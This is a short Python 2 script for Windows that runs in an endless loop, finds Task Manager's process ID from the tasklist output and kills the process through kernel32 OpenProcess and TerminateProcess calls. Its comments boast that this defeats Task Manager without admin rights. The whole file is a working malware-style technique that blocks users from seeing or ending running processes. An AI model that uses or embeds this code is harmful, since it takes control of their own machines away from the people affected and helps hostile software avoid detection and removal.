import ctypes, os , time


PROCESS_TERMINATE = 0x0001
while True:
    processi=os.popen("tasklist").read()  #FInding taskmgr.exe on tasklist
    if "Taskmgr" in processi:
        res=os.popen("tasklist /v /fo table | findstr /i ""TaskMgr"" ").read()  #searching for pid
        res=res.replace("Taskmgr.exe ","")
        res=res.replace(" ","")
        print res
        trovato=True
        i=0
        pid=""
        while trovato :  #GOT TASKMANAGER PID YEAH = PWN TASKMANAGER WITHOUT ADMIN RIGHTS
        #TASKKILL ON CMD WILL REQUIRE ADMIN RIGHTS BUT WITH PID I CAN KILL IT WITH CTYPES AND WINDLL
            pid+=res[i]
            i=i+1
            if res[i].isalpha() :
                trovato=False
                print pid
    


        handle = ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE, 0, int(pid)) #CLOSING TASKMGR
        ctypes.windll.kernel32.TerminateProcess(handle, -1)
        ctypes.windll.kernel32.CloseHandle(handle)
        print "killed task manager HUEHueUhEUHUEHuHe"

